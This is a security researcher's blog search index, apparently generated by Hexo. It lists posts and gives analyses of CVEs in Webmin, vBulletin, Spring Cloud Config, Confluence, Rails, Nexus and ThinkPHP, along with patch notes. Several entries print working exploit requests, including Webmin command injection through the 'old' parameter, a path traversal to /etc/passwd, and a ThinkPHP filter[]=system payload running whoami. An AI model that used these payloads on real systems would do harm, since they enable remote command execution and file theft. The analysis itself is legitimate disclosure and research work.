<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[一些文章]]></title>
      <url>%2F3017%2F07%2F26%2F%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0%2F</url>
      <content type="text"><![CDATA[一些自己写的文章。 Project cmsPoc:CMS渗透测试框架 Web-Security-Learning Software-Security-Learning Code-Audit-Challenges The Path to Machine Learning Awesome CTF Book Vuln-Time Web SecuritySummary XSStrike 源码阅读 php文件包含漏洞 命令执行的一些绕过技巧 php代码执行漏洞 MySql注入备忘录 php代码审计小总结 小试XML实体注入攻击 浅谈php反序列化漏洞 利用PHP的OPcache机制getshell Vuln Analysis Discuz v3.4 排行页面存储型XSS漏洞分析 Destoon 20180827版本 前台getshell GitLab远程代码执行漏洞分析 -【CVE-2018-14364】 【Struts2-代码执行漏洞分析系列】S2-057 Ruby on Rails 路径穿越与任意文件读取漏洞分析 -【CVE-2018-3760】 OpenTSDB远程命令执行漏洞分析 -【CVE-2018-12972】 [Jenkins 任意文件读取漏洞复现与分析 - 【CVE-2018-1999002】](https://chybeta.github.io/2018/08/07/Jenkins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%9 6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1999002%E3%80%91/) WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】 Apache Solr XXE漏洞分析 -【CVE-2018-8026】 RCE with Git submodule分析-【CVE-2018-11235】 Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】 RCE with spring-security-oauth2 分析-【CVE-2018-1260】 【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005 GitList 0.6 Unauthenticated RCE 分析 Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】 Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析 spring-messaging Remote Code Execution 分析-【CVE-2018-1270】 某商城文件上传漏洞与SQL注入漏洞 PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】 某CMS 5.X版本 管理员密码重置漏洞 某CMS V5.7 SP2 后台Getshell 【struts2 命令/代码执行漏洞分析系列】S2-001 阿里先知安全社区：Electron &lt; v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】 阿里先知安全社区：Smarty &lt;= 3.1.32 PHP代码执行漏洞分析—【CVE-2017-1000480】 axublog v1.0.6 两处sql注入分析 AppCMS 2.0.101 后门分析 [CVE-2016-7565]Exponent CMS 2.3.9 配置文件写入 getshell分析 Node.js中的反序列化漏洞：CVE-2017-5941 DiscuzX v3.4 任意文件删除漏洞 ICMSv7.0.1 admincp.class.php sql注入分析 PHPCMS v9.6.0 wap模块sql注入漏洞分析 PHPCMS v9.6.0 任意文件上传漏洞分析 Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞 [CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 [CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 代码审计之SQL注入：BlueCMSv1.6 sp1 Bin Security Linux kernel development (1): 环境准备 逆向学习笔记（一） ROP学习：利用通用gadget ROP学习：64位栈溢出 机器学习 机器学习算法：最近邻(KNN) 机器学习算法：感知机(perceptron) Tensorflow学习：常用API win下tensorflow安装避坑指南 数据挖掘 数据挖掘比赛（0）环境搭建之anaconda安装 数据挖掘比赛（1）对无列名的txt数据集读取方法及处理 数据挖掘比赛（2）利用pandas读取大型数据集 数据挖掘比赛（3）申请anaconda-academic-license并使用 数据挖掘比赛（4）ten Minutes to pandas中文版上 数据挖掘比赛（5）ten Minutes to pandas中文版下 程序之美 Requests v0.2.0 源码阅读 pip-pop 源码阅读 Flask Web开发笔记(1):程序的基本结构 hexo-rss链接问题修复方法 win下Docker默认存储位置修改 windows平台下Docker环境搭建 编程练习 ACM-OJ[长期更新] hihoCoder 162周：回文字符串 CodeTrain(3)数组单调和 CodeTrain(2)棋子翻转 CodeTrain(1)最大差值 随笔 记2017年阿里巴巴之行 WriteupWebCTF Python is the best language-writeup AceBear Security Contest-Tet Shopping-Writeup AceBear Security Contest-部分Web-writeup Insomni’hack teaser 2018-Smart-Y-writeup Insomni’hack teaser 2018-VulnShop-writeup 赛博地球杯工业互联网安全大赛-Web-writeup 一道CTF题：PHP文件包含 HITCON CTF 2017-BabyFirst Revenge-writeup 2017年百越杯AWD-web-writeup Hack.lu CTF 2017-Flatscience-writeup Square CTF 2017-Web-writeup BackdoorCTF 2017-Extends Me-writeup CSAW CTF 2017-LittleQuery-writeup CSAW CTF 2017-Shia Labeouf-off-writeup CSAW CTF 2017-Orange v1-writeup 问鼎杯 CTF writeup SEC-T CTF2017-Naughty ads-writeup SEC-T CTF2017-Sprinkler system-writeup ASISCTF2017-GSA File Server-writeup ASISCTF2017-Mathilda-writeup WeChall-PHP-writeup TWCTF 2017-Super Secure Storage-writeup TWCTF 2017-Freshen Uploader-writeup ISG2017-wmwcms-writeup HITB CTF 2017-Pasty-writeup Hackit2017-H4ck3rM1nd-writeup Hackit2017-Weekands of hacker-writeup Hackit2017-V1rus3pidem1c-writeup Hackit2017-B3tterS0ci4lN3twork-writeup HackCon2017-Web-writeup XNUCA2017-第一期：Web-writeup XMAN夏令营-2017-XSS-writeup XMAN夏令营-2017-比赛系统-writeup XMAN夏令营-2017-babyweb-writeup XNUCA 2017-Web专题赛前指导-default-writeup XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup XNUCA 2017-Web专题赛前指导-Document-writeup XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup XNUCA 2017-Web专题赛前指导-vote-writeup XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup SHACTF-2017-Web-writeup BugsBunnyCTF2017-web-writeup 实验吧-web-writeup CTFZone-2017-Leaked messages-writeup XMAN选拔赛-2017-web-writeup Meenpwn-2017-web-writeup 一道好玩的webshell题 jarvisoj-web-writeup ringzer0team-js-writeup ringzer0team-web-writeup xss-quiz-writeup GCTF-web-writeup “春秋杯”web-writeup 南邮CTF平台web前30题解 sqli-lab Sqli-Labs:Less17-writeup Sqli-Labs:Less15~16-writeup Sqli-Labs:Less13~14-writeup Sqli-Labs:Less11~12-writeup Sqli-Labs:Less8~10-writeup Sqli-Labs:Less7-writeup Sqli-Labs:Less5-6-writeup Sqli-Labs:Less1-4-writeup PwnCTF TWCTF 2017-swap-writeup Codegate 2017 Qual-babypwn-writeup BugsBunnyCTF2017-pwn-writeup XMAN选拔赛-2017-pwn-writeup XMAN-pwn-writeup SUCTF-2016-pwn400-writeup pwnable.kr Pwnable.kr:shellshock Pwnable.kr:mistake Pwnable.kr:random Pwnable.kr:passcode Pwnable.kr:bof Misc CSAW CTF 2017-MISC-writeup ASISCTF2017-ASIS secret letter-writeup Hackit2017-Cypherpunk’s nightmare-writeup Hackit2017-USB ducker-writeup ISG2017-赛前练手题—writeup HackCon2017-Steg-writeup SHACTF-2017-Growing Up-writeup SHACTF-2017-WannaFly-writeup BugsBunnyCTF2017-misc-writeup 0ctf-2015-Peers-writeup XMAN选拔赛-2017-misc-writeup Crypto ASISCTF2017-Simple Crypto-writeup BugsBunnyCTF2017-crypto-writeup Meenpwn-2017-crypto-writeup Re TWCTF 2017-Rev Rev Rev-writeup BugsBunnyCTF2017-Reverse-writeup]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[《蓝队视角下的防御体系突破》.xmind]]></title>
      <url>%2F2021%2F08%2F30%2F%E3%80%8A%E8%93%9D%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E9%98%B2%E5%BE%A1%E4%BD%93%E7%B3%BB%E7%AA%81%E7%A0%B4%E3%80%8B-xmind%2F</url>
      <content type="text"><![CDATA[拜读一下奇安信的《蓝队视角下的防御体系突破》，简单做个笔记。 XMind: 蓝队视角下的防御体系突破.xmind PDF: 蓝队视角下的防御体系突破.PDF 侵删。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[【CVE-2019-16759】:pre-auth RCE in vBulletin 5.x]]></title>
      <url>%2F2019%2F09%2F28%2F%E3%80%90CVE-2019-16759%E3%80%91-pre-auth-RCE-in-vBulletin-5-x%2F</url>
      <content type="text"><![CDATA[pre-auth RCE in vBulletin 5.x . https://twitter.com/chybeta/status/1176702424045772800 中文： https://xz.aliyun.com/t/6419 0x01 Summaryhttps://seclists.org/fulldisclosure/2019/Sep/31 0x02 AnalysisThe first parameter routestring tell what template should vBulletin look for. In the callRender()，$routeInfo[2] will be set as widget_php and $params will contains the render config $widgetCongi[code] In \core\install\vbulletin-style.xml，we can fidn a template named widget_php So when $widgetConfig[&#39;code&#39;] is not null and the setting disable_php_rendering isn’t disabled, vBulletin will use the following syntax to render template：12&#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;&#123;vb:raw $evaledPHP&#125; In includes\vb5\frontend\controller\bbcode.php , you can find how evalCode defined： Finally cause PHP-Template injection and pre-auth RCE in vBulletin 5.x。 0x03 Reproduce]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[【CVE-2019-15107】:RCE in Webmin]]></title>
      <url>%2F2019%2F08%2F19%2F%E3%80%90CVE-2019-15107%E3%80%91-RCE-in-Webmin-1-920-via-password-change%2F</url>
      <content type="text"><![CDATA[CVE-2019-15107:RCE in Webmin &lt;= 1.920 via password-change 中文：https://xz.aliyun.com/t/6040 0x01 Reproduce webmin 1.920 Ubuntu To reproduce this vulnerability, you need enable the password-change feature. https://ip:10000/webmin/edit_session.cgi?xnavigation=1 : Then you can check the config and the passwd_mode value has been changed1234# cat /etc/webmin/miniserv.conf...passwd_mode=2... You can capture post request like this:12345678910111213141516171819POST /password_change.cgi HTTP/1.1Host: yourip:10000Connection: closeContent-Length: 63Cache-Control: max-age=0Origin: https://yourip:10000Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36Sec-Fetch-Mode: navigateSec-Fetch-User: ?1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Sec-Fetch-Site: same-originReferer: https://yourip:10000/session_login.cgiAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: redirect=1; testing=1; sessiontest=1; sid=xuser=root&amp;pam=1&amp;expired=2&amp;old=buyaoxiedaopocli&amp;new1=buyaoxiedaopocli&amp;new2=buyaoxiedaopocli Set the parameter old value as |ifconfig 0x02 AnalysisIn password_change.cgi ：123456789101112131415# line 18 ~ line 31# Is this a Webmin user?if (&amp;foreign_check("acl")) &#123; &amp;foreign_require("acl", "acl-lib.pl"); ($wuser) = grep &#123; $_-&gt;&#123;'name'&#125; eq $in&#123;'user'&#125; &#125; &amp;acl::list_users(); if ($wuser-&gt;&#123;'pass'&#125; eq 'x') &#123; # A Webmin user, but using Unix authentication $wuser = undef; &#125; elsif ($wuser-&gt;&#123;'pass'&#125; eq '*LK*' || $wuser-&gt;&#123;'pass'&#125; =~ /^\!/) &#123; &amp;pass_error("Webmin users with locked accounts cannot change ". "their passwords!"); &#125;&#125; The code will check whether the parameter user is a Webmin user. If there is a Webmin user named root and we set user=root,then the $wuser‘s value will be root. If we set user=xxxx，then $wuser will still be undef after grep。 However the following is $wuser-&gt;{&#39;pass&#39;}，which will change $wuser value from undef to {} So whatever user you have provided, you will be step in the code segment to update webmin user’s password. user=root user=noexists_user Now let’s check the password_change.cgi line 37 ~ line 40：123456if ($wuser) &#123; # Update Webmin user's password $enc = &amp;acl::encrypt_password($in&#123;'old'&#125;, $wuser-&gt;&#123;'pass'&#125;); $enc eq $wuser-&gt;&#123;'pass'&#125; || &amp;pass_error($text&#123;'password_eold'&#125;,qx/$in&#123;'old'&#125;/); ...&#125; The implemention of function encrypt_password is of no importance . You should pay attention to how Webmin handles the error message. 1&amp;pass_error($text&#123;'password_eold'&#125;,qx/$in&#123;'old'&#125;/); Webmin just put our parameter old in qx/.../！ And after executing system commands, Webmin will print the result: So in conclusion there is no need to add a vertical bar (|) , we just set our parameter old value as ifconfig By the way , there is an interesting issue https://github.com/webmin/webmin/issues/947 0x03 Patchwebmin 1.930 fix this security vulnerability by removing the qx() backdoor：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[【CVE-2019-3799】:Directory Traversal with spring-cloud-config-server]]></title>
      <url>%2F2019%2F04%2F18%2F%E3%80%90CVE-2019-3799%E3%80%91-Directory-Traversal-with-spring-cloud-config-server%2F</url>
      <content type="text"><![CDATA[Twitter: chybeta Security Advisoryhttps://pivotal.io/security/cve-2019-3799 ReproduceDEMO： https://github.com/spring-cloud/spring-cloud-config#quick-start 12GET /foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd HTTP/1.1Host: localhost:8888 AnalysisSpring Cloud Config provides server and client-side support for externalized configuration in a distributed system. With the Config Server you have a central place to manage external properties for applications across all environments. According to the DOC，The Config Server provides these through an additional endpoint at /{name}/{profile}/{label}/{path} where name, profile and label have the same meaning as the regular environment endpoint, but path is a file name (e.g. log.xml)。For example if we want get test.json as plain text, you can send this request：1GET http://127.0.0.1:8888/foo/label/master/test.json So how the backend handle this request? When we send the payload, server will dispatcher the request to org/springframework/cloud/config/server/resource/ResourceController.java:54： Step into retrieve function which located inorg/springframework/cloud/config/server/resource/ResourceController.java:104 ：1234567synchronized String retrieve(ServletWebRequest request, String name, String profile, String label, String path, boolean resolvePlaceholders) throws IOException &#123; name = resolveName(name); label = resolveLabel(label); Resource resource = this.resourceRepository.findOne(name, profile, label, path); ... &#125; Continue step into the findOne function: You can see the locations value is file:/tmp/config-repo-7168113927339570935/. The Config-Server will pull the remote repo and use the locations folder to store these temporary files： Notice the path value is ..%2F..%2F..%2F..%2Fetc%2fpasswd，so actually the full path like this ： at the end, when call StreamUtils.copyToString(is, Charset.forName(&quot;UTF-8&quot;), we can read the /etc/passwd content： Patchhttps://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2 The backend will check whether the resource paths is valid via isInvalidPath and isInvalidEncodedPath:：1234567if (!isInvalidPath(local) &amp;&amp; !isInvalidEncodedPath(local)) &#123; Resource file = this.resourceLoader.getResource(location) .createRelative(local); if (file.exists() &amp;&amp; file.isReadable()) &#123; return file; &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[【CVE-2019-3396】:SSTI and RCE in Confluence Server via Widget Connector]]></title>
      <url>%2F2019%2F04%2F06%2FAnalysis-for-%E3%80%90CVE-2019-3396%E3%80%91-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector%2F</url>
      <content type="text"><![CDATA[Twitter: chybeta Security Advisoryhttps://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html AnalysisAccording to the document , there are three parameters that you can set to control the content or format of the macro output, including URL、Width and Height. the Widget Connector has defind some renders. for example the FriendFeedRenderer:123456789public class FriendFeedRenderer implements WidgetRenderer&#123; ... public String getEmbeddedHtml(String url, Map&lt;String, String&gt; params) &#123; params.put("_template", "com/atlassian/confluence/extra/widgetconnector/templates/simplejscript.vm"); return this.velocityRenderService.render(getEmbedUrl(url), params); &#125;&#125; In FriendFeedRenderer‘s getEmbeddedHtml function , you will see they put another option _template into params map. However, some other renderers, such as in video category , just call render(getEmbedUrl(url), params) directly So in this situation, we can &quot;offer&quot; the _template ourseleves which the backend will use the params to render Reproduce123POST /rest/tinymce/1/macro/preview HTTP/1.1&#123;&quot;contentId&quot;:&quot;65601&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/test&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;../web.xml&quot;&#125;,&quot;body&quot;:&quot;&quot;&#125;&#125; RCEPatchin fix version, it will call doSanitizeParameters before render html which will remove the _template in parameters. The code may like this:123456789101112131415161718192021222324252627public class WidgetMacro extends BaseMacro implements Macro, EditorImagePlaceholder&#123; public WidgetMacro(RenderManager renderManager, LocaleManager localeManager, I18NBeanFactory i18NBeanFactory) &#123; ... this.sanitizeFields = Collections.unmodifiableList(Arrays.asList(new String[] &#123; "_template" &#125;)); &#125; ... public String execute(Map&lt;String, String&gt; parameters, String body, ConversionContext conversionContext) &#123; ... doSanitizeParameters(parameters); return this.renderManager.getEmbeddedHtml(url, parameters); &#125; private void doSanitizeParameters(Map&lt;String, String&gt; parameters) &#123; Objects.requireNonNull(parameters); for (String sanitizedParameter : this.sanitizeFields) &#123; parameters.remove(sanitizedParameter); &#125; &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Analysis for【CVE-2019-5418】File Content Disclosure on Rails]]></title>
      <url>%2F2019%2F03%2F16%2FAnalysis-for%E3%80%90CVE-2019-5418%E3%80%91File-Content-Disclosure-on-Rails%2F</url>
      <content type="text"><![CDATA[Chinese Edition: Ruby on Rails 路径穿越与任意文件读取漏洞分析 - 【CVE-2019-5418】 Security Advisoryhttps://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q AnalysisThe render method can use a view that’s entirely outside of your application. So in actionview-5.2.1/lib/action_view/renderer/template_renderer.rb:22, it will call find_file to determine which template to be rendered。123456789101112module ActionView class TemplateRenderer &lt; AbstractRenderer #:nodoc: # Determine the template to be rendered using the given options. def determine_template(options) keys = options.has_key?(:locals) ? options[:locals].keys : [] if options.key?(:body) ... elsif options.key?(:file) with_fallbacks &#123; find_file(options[:file], nil, false, keys, @details) &#125; ... endend In the find_file method:123def find_file(name, prefixes = [], partial = false, keys = [], options = &#123;&#125;) @view_paths.find_file(*args_for_lookup(name, prefixes, partial, keys, options))end step into args_for_lookup method which to generate the options. When it returns, our payload will be saved in details[formats] : then it will execute @view_paths.find_file which located in actionview-5.2.1/lib/action_view/path_set.rb：12345678910111213141516171819class PathSet #:nodoc: def find_file(path, prefixes = [], *args) _find_all(path, prefixes, args, true).first || raise(MissingTemplate.new(self, path, prefixes, *args)) end private def _find_all(path, prefixes, args, outside_app) prefixes = [prefixes] if String === prefixes prefixes.each do |prefix| paths.each do |resolver| if outside_app templates = resolver.find_all_anywhere(path, prefix, *args) else templates = resolver.find_all(path, prefix, *args) end return templates unless templates.empty? end end [] end Because the view is outside of your application，so outside_app equalsTrue and then will call find_all_anywhere12345def find_all_anywhere(name, prefix, partial = false, details = &#123;&#125;, key = nil, locals = []) cached(key, [name, prefix, partial], details, locals) do find_templates(name, prefix, partial, details, true) endend Skip cached part， the find_templates will according the options to find the template to render: 1234567891011121314151617181920 # An abstract class that implements a Resolver with path semantics.class PathResolver &lt; Resolver #:nodoc: EXTENSIONS = &#123; locale: ".", formats: ".", variants: "+", handlers: "." &#125; DEFAULT_PATTERN = ":prefix/:action&#123;.:locale,&#125;&#123;.:formats,&#125;&#123;+:variants,&#125;&#123;.:handlers,&#125;" ... private def find_templates(name, prefix, partial, details, outside_app_allowed = false) path = Path.build(name, prefix, partial) # 注意 details 与 details[:formats] 的传入 query(path, details, details[:formats], outside_app_allowed) end def query(path, details, formats, outside_app_allowed) query = build_query(path, details) template_paths = find_template_paths(query) ... end end After build_query , the variables ： SO here we use ../ to make directory traversal，and use double { to make sure syntax right. After File.expand_path , the result is: 1/etc/passwd&#123;&#123;&#125;,&#125;&#123;+&#123;&#125;,&#125;&#123;.&#123;raw,erb,html,builder,ruby,coffee,jbuilder&#125;,&#125; so the /etc/passwd will be treated the template to be rended ，which lead to a arbitrary file read attack. Reproduceinstall vulnerable Rails (e.g 5.2.1)1234# echo &quot;gem &apos;rails&apos;, &apos;5.2.1&apos;&quot; &gt;&gt; Gemfile# echo &quot;gem &apos;sqlite3&apos;, &apos;~&gt; 1.3.6&apos;, &apos;&lt; 1.4&apos;&quot; &gt;&gt; Gemfile# echo &quot;source &apos;https://rubygems.org&apos;&quot; &gt;&gt; Gemfile# bundle exec rails new . --force --skip-bundle Generate controller:1# rails generate controller chybeta Inapp/controllers/chybeta_controller.rb ：12345class ChybetaController &lt; ApplicationController def index render file: "#&#123;Rails.root&#125;/some/file" endend add resources in config/routes.rb:123Rails.application.routes.draw do resources :chybetaend Patchhttps://github.com/rails/rails/commit/f4c70c2222180b8d9d924f00af0c7fd632e26715]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Nexus Repository Manager 3 RCE 分析 -【CVE-2019-7238】]]></title>
      <url>%2F2019%2F02%2F18%2FNexus-Repository-Manager-3-RCE-%E5%88%86%E6%9E%90-%E3%80%90CVE-2019-7238%E3%80%91%2F</url>
      <content type="text"><![CDATA[中文版本：chinese edition Summaryhttps://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019 Affected Versions: Nexus Repository Manager 3.6.2 OSS/Pro versions up to and including 3.14.0 Fixed in Version: Nexus Repository Manager OSS/Pro version 3.15.0 Nice find from Rico @ Tencent Security Yunding Lab and voidfyoo @ Chaitin Tech AnalysisIn plugins/nexus-coreui-plugin/src/main/java/org/sonatype/nexus/coreui/ComponentComponent.groovy:185123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@Named@Singleton@DirectAction(action = 'coreui_Component')class ComponentComponent extends DirectComponentSupport&#123; ... @DirectMethod @Timed @ExceptionMetered PagedResponse&lt;AssetXO&gt; previewAssets(final StoreLoadParameters parameters) &#123; String repositoryName = parameters.getFilter('repositoryName') String expression = parameters.getFilter('expression') String type = parameters.getFilter('type') // get three parameters repositoryName 、 expression 、 type if (!expression || !type || !repositoryName) &#123; return null &#125; // set the repositoryName RepositorySelector repositorySelector = RepositorySelector.fromSelector(repositoryName) // according the type to get validator if (type == JexlSelector.TYPE) &#123; jexlExpressionValidator.validate(expression) &#125; else if (type == CselSelector.TYPE) &#123; cselExpressionValidator.validate(expression) &#125; List&lt;Repository&gt; selectedRepositories = getPreviewRepositories(repositorySelector) if (!selectedRepositories.size()) &#123; return null &#125; def result = browseService.previewAssets( repositorySelector, selectedRepositories, expression, toQueryOptions(parameters)) return new PagedResponse&lt;AssetXO&gt;( result.total, result.results.collect(ASSET_CONVERTER.rcurry(null, null, [:], 0)) // buckets not needed for asset preview screen ) &#125; ...&#125; Nexus introduced CSEL based selectors to support changes coming in future releases. CSEL is a light version of JEXL used to script queries along specific paths and coordinates available to your repository manager formats. Step in browseService.previewAssets，and its implementations in components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/BrowseServiceImpl.java:2331234567891011121314151617181920212223242526272829303132333435363738394041424344@Named@Singletonpublic class BrowseServiceImpl extends ComponentSupport implements BrowseService&#123; ... @Override public BrowseResult&lt;Asset&gt; previewAssets(final RepositorySelector repositorySelector, final List&lt;Repository&gt; repositories, final String jexlExpression, final QueryOptions queryOptions) &#123; checkNotNull(repositories); checkNotNull(jexlExpression); final Repository repository = repositories.get(0); try (StorageTx storageTx = repository.facet(StorageFacet.class).txSupplier().get()) &#123; storageTx.begin(); List&lt;Repository&gt; previewRepositories; if (repositories.size() == 1 &amp;&amp; groupType.equals(repository.getType())) &#123; previewRepositories = repository.facet(GroupFacet.class).leafMembers(); &#125; else &#123; previewRepositories = repositories; &#125; PreviewAssetsSqlBuilder builder = new PreviewAssetsSqlBuilder( repositorySelector, jexlExpression, queryOptions, getRepoToContainedGroupMap(repositories)); String whereClause = String.format("and (%s)", builder.buildWhereClause()); //The whereClause is passed in as the querySuffix so that contentExpression will run after repository filtering return new BrowseResult&lt;&gt;( storageTx.countAssets(null, builder.buildSqlParams(), previewRepositories, whereClause), Lists.newArrayList(storageTx.findAssets(null, builder.buildSqlParams(), previewRepositories, whereClause + builder.buildQuerySuffix())) ); &#125; &#125; ...&#125; Pay attention to the comment: whereClause will run after repository filtering! We need to know how it is constructed. In the components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/PreviewAssetsSqlBuilder.java:51 , which introduce contentExpression and jexlExpression:123456789public class PreviewAssetsSqlBuilder&#123; ... public String buildWhereClause() &#123; return whereClause("contentExpression(@this, :jexlExpression, :repositorySelector, " + ":repoToContainedGroupMap) == true", queryOptions.getFilter() != null); &#125; ...&#125; So after repository filtering，whereClause will run automatically which call contentExpression.execute() method 。In components/nexus-repository/src/main/java/org/sonatype/nexus/repository/selector/internal/ContentExpressionFunction.java123456789101112131415161718192021222324252627282930313233343536public class ContentExpressionFunction extends OSQLFunctionAbstract&#123; public static final String NAME = "contentExpression"; ... @Inject public ContentExpressionFunction(final VariableResolverAdapterManager variableResolverAdapterManager, final SelectorManager selectorManager, final ContentAuthHelper contentAuthHelper) &#123; super(NAME, 4, 4); this.variableResolverAdapterManager = checkNotNull(variableResolverAdapterManager); this.selectorManager = checkNotNull(selectorManager); this.contentAuthHelper = checkNotNull(contentAuthHelper); &#125; @Override public Object execute(final Object iThis, final OIdentifiable iCurrentRecord, final Object iCurrentResult, final Object[] iParams, final OCommandContext iContext) &#123; OIdentifiable identifiable = (OIdentifiable) iParams[0]; // asset ODocument asset = identifiable.getRecord(); RepositorySelector repositorySelector = RepositorySelector.fromSelector((String) iParams[2]); // jexlExpression 即 iParams[1] String jexlExpression = (String) iParams[1]; List&lt;String&gt; membersForAuth; ... return contentAuthHelper.checkAssetPermissions(asset, membersForAuth.toArray(new String[membersForAuth.size()])) &amp;&amp; checkJexlExpression(asset, jexlExpression, asset.field(AssetEntityAdapter.P_FORMAT, String.class)); &#125; According to the code contentExpression(@this, :jexlExpression, :repositorySelector, &quot; +&quot;:repoToContainedGroupMap) == true , you can map contentExpression parameters to iParams[i]: @this -&gt; iParams[0] jexlExpression -&gt; iParams[1] repositorySelector -&gt; iParams[2] In last, it will call checkJexlExpression() method: 123456789101112131415161718192021222324252627 ... private boolean checkJexlExpression(final ODocument asset, final String jexlExpression, final String format) &#123; VariableResolverAdapter variableResolverAdapter = variableResolverAdapterManager.get(format); VariableSource variableSource = variableResolverAdapter.fromDocument(asset); SelectorConfiguration selectorConfiguration = new SelectorConfiguration(); selectorConfiguration.setAttributes(ImmutableMap.of("expression", jexlExpression)); // JexlSelector.TYPE which is defined as 'jexl' selectorConfiguration.setType(JexlSelector.TYPE); selectorConfiguration.setName("preview"); try &#123; // evaluate!!! return selectorManager.evaluate(selectorConfiguration, variableSource); &#125; catch (SelectorEvaluationException e) &#123; log.debug("Unable to evaluate expression &#123;&#125;.", jexlExpression, e); return false; &#125; &#125;&#125; So, we can step in selectorManager.evaluate，which is implemented in components/nexus-core/src/main/java/org/sonatype/nexus/internal/selector/SelectorManagerImpl.java:156 ，and finally evaluate the expression: @Override @Guarded(by = STARTED) public boolean evaluate(final SelectorConfiguration selectorConfiguration, final VariableSource variableSource) throws SelectorEvaluationException { Selector selector = createSelector(selectorConfiguration); try { return selector.evaluate(variableSource); } catch (Exception e) { throw new SelectorEvaluationException(&quot;Selector &#39;&quot; + selectorConfiguration.getName() + &quot;&#39; evaluation in error&quot;, e); } } Reproducible stepsAccording to DOCS：https://help.sonatype.com/repomanager3/configuration/repository-management#RepositoryManagement-CreatingaQuery To reproduce the issue successfully, we need upload some assets to the repo firstly。For excample, upload a jar: Then go here to intercept the request: POC： Fix Add the permission requirement: @RequiresPermissions(&#39;nexus:selectors:*&#39;)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析]]></title>
      <url>%2F2019%2F01%2F13%2FThinkPHP-5-0-0-5-0-23-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[2019年1月11日，ThinkPHP官方发布安全更新，修复了一个GETSHELL漏洞。现分析如下。 漏洞复现以 thinkphp 5.0.22 完整版为例，下载地址：http://www.thinkphp.cn/down/1260.html 未开启调试模式。 12345http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami 漏洞分析之POC 1先整体的看一下这个流程，tp程序从 App.php文件开始，其中截取部分如下：12345678910111213141516171819202122232425262728/*** 执行应用程序* @access public* @param Request $request 请求对象* @return Response* @throws Exception*/public static function run(Request $request = null)&#123; $request = is_null($request) ? Request::instance() : $request; try &#123; ... // 获取应用调度信息 $dispatch = self::$dispatch; // 未设置调度信息则进行 URL 路由检测 if (empty($dispatch)) &#123; $dispatch = self::routeCheck($request, $config); &#125; ... $data = self::exec($dispatch, $config); &#125; catch (HttpResponseException $exception) &#123; ... &#125; ...&#125; 在App.php中，会根据请求的URL调用routeCheck进行调度解析获得到$dispatch，之后将进入exec($dispatch, $config)根据$dispatch类型的不同来进行处理。 在payload中，访问的url为index.php?s=captcha。在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由， 因此其对应的dispatch为method： 一步步跟入，其调用栈如下： 通过调用Request类中的method方法来获取当前的http请求类型，这里顺便贴一下该方法被调用之处： 该函数的实现在 thinkphp/library/think/Request.php:5121234567891011121314151617181920212223/** * 当前的请求类型 * @access public * @param bool $method true 获取原始请求类型 * @return string */public function method($method = false)&#123; if (true === $method) &#123; // 获取原始请求类型 return $this-&gt;server('REQUEST_METHOD') ?: 'GET'; &#125; elseif (!$this-&gt;method) &#123; if (isset($_POST[Config::get('var_method')])) &#123; $this-&gt;method = strtoupper($_POST[Config::get('var_method')]); $this-&gt;&#123;$this-&gt;method&#125;($_POST); &#125; elseif 